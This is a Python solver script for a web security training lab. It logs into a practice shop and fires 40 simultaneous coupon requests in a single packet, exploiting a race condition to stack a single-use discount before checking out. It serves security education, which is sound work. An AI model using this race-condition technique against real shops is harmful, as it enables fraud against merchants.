from web_security_academy.core.async_lab_session import AsyncLabSession
from web_security_academy.core.logger import logger

from urllib.parse import urljoin
from bs4 import BeautifulSoup
from requests import Request

import re


def solve_lab(session):
    session.login("wiener", "peter")
    data = {"productId": "1", "quantity": "1", "redir": "PRODUCT"}
    resp = session.post_path("/cart", data=data)
    logger.info('Add a "Lightweight l33t leather jacket" to cart.')

    csrf = session.get_csrf_token("/cart")
    data = {"csrf": csrf, "coupon": "PROMO20"}

    req = Request("POST", urljoin(session.url, "/cart/coupon"), data=data)
    session.single_packet_send(*[session.prepare_request(req) for _ in range(40)])
    logger.info('Attempted to apply 40 simultaneous "PROMO20" coupons')

    resp = session.get_path("/cart")
    soup = BeautifulSoup(resp.text, "lxml")
    regex = re.compile(r"^\$([^.]+)")
    total = soup.find("th", text=regex).text
    dollars = int(re.match(regex, total).group(1))

    if dollars >= 50:
        logger.failure(f"Current total: {total}")
        return

    logger.success(f"Current total: {total}")
    csrf = session.get_csrf_token("/cart", n=2)
    resp = session.post_path("/cart/checkout", data={"csrf": csrf})
    logger.success("Successfully checked out")
